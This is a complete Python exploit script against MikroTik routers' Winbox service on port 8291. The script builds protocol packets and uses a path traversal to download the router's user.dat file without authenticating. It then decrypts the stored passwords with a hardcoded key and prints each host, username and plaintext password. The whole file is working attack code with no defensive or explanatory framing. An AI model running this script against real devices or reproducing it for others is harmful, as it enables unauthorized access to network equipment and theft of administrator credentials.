#!/usr/bin/env python3

import binascii, struct, socket, sys, hashlib

TIMEOUT = 10

# Packet headers
M2_HEADER = b'\x4d\x32'
M2_EXTRA  = b'\x01\x00'

# Winbox protocol types
MT_BOOL       = 0x00
MT_BOOL_CODE  = {False: 0x00, True: 0x01}
MT_BOOL_VALUE = {0x00: False, 0x01: True}
MT_DWORD      = 0x08
MT_BYTE       = 0x09
MT_STRING     = 0x21
MT_HASH       = 0x31
MT_ARRAY      = 0x88

# Add M2 header and sizes to the stream (there's no check if size exceeds one 255)
def m2_header(stream):
	size = len(stream)
	result = struct.pack('B', size + 4) + M2_EXTRA + struct.pack('B', size + 2) + M2_HEADER + stream
	print(binascii.hexlify(result).decode('UTF-8'))
	return result

# Return an array of M2 blocks, each cointaining an array of tuples like (code, type, value)
def m2_parse(stream):
	result = []

	pointer = 0
	stream_size = len(stream)

	while pointer < stream_size:
		keywords = []

		header_block_size = ord(stream[pointer:pointer+1])
		pointer += 1
		if stream[pointer:pointer+2] != M2_EXTRA:
			return None
		pointer += 2
		m2_block_size = ord(stream[pointer:pointer+1])
		pointer += 1
		if stream[pointer:pointer+2] != M2_HEADER:
			print('Not a M2 block')
			return None
		if header_block_size != (m2_block_size + 2):
			print('M2 header and block sizes mismatch!')
			return None
		pointer += 2

		block_data_start = pointer

		while pointer < (block_data_start + m2_block_size - 2):
			# Configuration ID, or keyword_code, is always 3 bytes long
			keyword_code = struct.unpack('<I', stream[pointer:pointer+3] + b'\x00')[0]
			pointer += 3
			# The next is one byte keyword type
			keyword_type = ord(stream[pointer:pointer+1])
			if keyword_type in MT_BOOL_CODE:
				keyword_value = MT_BOOL_VALUE[keyword_type]
				pointer += 1
			elif keyword_type == MT_DWORD:
				pointer += 1
				keyword_value = struct.unpack('<I', stream[pointer:pointer+4])[0]
				pointer += 4
			elif keyword_type == MT_BYTE:
				pointer += 1
				keyword_value = struct.unpack('B', stream[pointer:pointer+1])[0]
				pointer += 1
			elif keyword_type == MT_STRING:
				pointer += 1
				length = ord(stream[pointer:pointer+1])
				pointer += 1
				keyword_value = stream[pointer:pointer+length].decode('UTF-8')
				pointer += length
			elif keyword_type == MT_HASH:
				pointer += 1
				length = ord(stream[pointer:pointer+1])
				pointer += 1
				keyword_value = stream[pointer:pointer+length]
				pointer += length
			elif keyword_type == MT_ARRAY:
				pointer += 1
				array_size = struct.unpack('<H', stream[pointer:pointer+2])[0]
				pointer += 2
				i = 0
				keyword_value = []
				while i < array_size:
					element = struct.unpack('<I', stream[pointer:pointer+4])[0]
					i += 1
					pointer += 4
					keyword_value.append(element)
			else:
				print('Unknown keyword/code')
				break
			keywords.append((keyword_code, keyword_type, keyword_value))
		result.append(keywords)
	return result

# Generate a stream for the given array of keywords, which are tuples of: (code, type, value)
def m2_bytes(keywords):
	result = b''
	for k in keywords:
		code, type, value = k

		if type == MT_BOOL:
			type = MT_BOOL_CODE[value]
			size_bytes = b''
			value_bytes = b''
		elif type == MT_DWORD:
			size_bytes = b''
			value_bytes = struct.pack('<I', value)
		elif type == MT_BYTE:
			size_bytes = b''
			value_bytes = struct.pack('B', value)
		elif type == MT_STRING:
			size_bytes = struct.pack('B', len(value))
			value_bytes = value.encode('UTF-8')
		elif type == MT_HASH:
			size_bytes = struct.pack('B', len(value))
			value_bytes = value
		elif type == MT_ARRAY:
			size_bytes = struct.pack('<H', len(value))
			value_bytes = b''
			for element in value:
				value_bytes += struct.pack('<I', element)
		code_bytes = struct.pack('<I', code)[0:3]
		type_bytes = struct.pack('B', type)
		result += (code_bytes + type_bytes + size_bytes + value_bytes)
	return result

def mt_freq_01(filename):
	m2 = []
	m2.append((0xff0005, MT_BOOL, True))
	m2.append((0xff0006, MT_BYTE, 7))
	m2.append((0xff0007, MT_BYTE, 7))
	m2.append((0x000001, MT_STRING, filename))
	m2.append((0xff0002, MT_ARRAY, [0, 8]))
	m2.append((0xff0001, MT_ARRAY, [2, 2]))
	return m2_header(m2_bytes(m2))

def mt_freq_02(sid):
	m2 = []
	m2.append((0xff0005, MT_BOOL, True))
	m2.append((0xff0006, MT_BYTE, 0))
	m2.append(sid)
	m2.append((0x000002, MT_DWORD, 0x8000))
	m2.append((0xff0007, MT_BYTE, 4))
	m2.append((0xff0002, MT_ARRAY, [0, 8]))
	m2.append((0xff0001, MT_ARRAY, [2, 2]))
	return m2_header(m2_bytes(m2))

# Get the session ID from the packet
def mt_get_sid(packet):
	m2_data = m2_parse(packet)
	if m2_data is not None:
		for block in m2_parse(packet):
			for keyword in block:
				code, type, value = keyword
				if code == 0xfe0001:
					return keyword
	return None

# Get the file size from the packet
def mt_get_fsize(packet):
	m2_data = m2_parse(packet)
	if m2_data is not None:
		for block in m2_parse(packet):
			for keyword in block:
				code, type, value = keyword
				if code == 0x000002 and (type == MT_DWORD or type == MT_BYTE):
					return value
	return None

def decrypt_password(user, pass_enc):
	key = hashlib.md5(user + b"283i4jfkai3389").digest()
	passw = ''
	for i in range(0, len(pass_enc)):
		passw += chr(pass_enc[i] ^ key[i % len(key)])
	return passw.split("\x00")[0]

def extract_user_pass_from_entry(entry):
	user_data = entry.split(b"\x01\x00\x00\x21")[1]
	pass_data = entry.split(b"\x11\x00\x00\x21")[1]


	user_len = user_data[0]
	pass_len = pass_data[0]
	username = user_data[1:1 + user_len]
	password = pass_data[1:1 + pass_len]
	return username, password

def get_pair(data):
	user_list = []
	entries = data.split(M2_HEADER)[1:]
	for entry in entries:
		try:
			user, pass_encrypted = extract_user_pass_from_entry(entry)
		except:
			continue

		pass_plain = decrypt_password(user, pass_encrypted)
		user  = user.decode("ascii")
		user_list.append((user, pass_plain))
	return user_list

if __name__ == '__main__':
	if len(sys.argv) < 2:
		print('Usage: %s <host>' % sys.argv[0])
		exit(0)

	host = sys.argv[1]

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(TIMEOUT)
	try:
		s.connect((host, 8291))
	except:
		print('[-] ERROR connecting to %s' % host)
		s.close()
		exit(1)

	p1 = mt_freq_01('./.././.././.././.././../rw/store/user.dat')
	try:
		print('[*] Sending the 1st packet to %s...' % host)
		s.send(p1)
	except:
		print('[-] ERROR sending the 1st packet to %s' % host)
		s.close()
		exit(1)
	try:
		print('[*] Reading the response to the 1st packet from %s...' % host)
		read = s.recv(1024)
	except:
		print('[-] ERROR reading response to the 1st packet from %s' % host)
		s.close()
		exit(1)

	#print(binascii.hexlify(read).decode('UTF-8'))
	fsize = mt_get_fsize(read)
	if fsize is None:
		print('[-] ERROR reading user database file size from %s' % host)
		s.close()
		exit(1)

	#print(fsize)
	sid = mt_get_sid(read)
	if sid is None:
		print('[-] ERROR reading session id from %s' % host)
		s.close()
		exit(1)
	p2 = mt_freq_02(sid)
	try:
		print('[*] Sending the 2nd packet to %s...' % host)
		s.send(p2)
	except:
		print('[-] ERROR sending the 2nd packet to %s' % host)
		s.close()
		exit(1)
	try:
		print('[*] Reading the response to the 2nd packet from %s...' % host)
		read = s.recv(fsize + 128)
	except:
		print('[-] ERROR reading response to the 2nd packet from %s' % host)
		s.close()
		exit(1)
	#print(binascii.hexlify(read).decode('UTF-8'))
	skip = len(read) - fsize - 2
	user_dat = read[skip:]
	user_pass = get_pair(user_dat)
	for u, p in user_pass:
		print("%s\t%s\t%s" % (host, u, p))
	s.close()
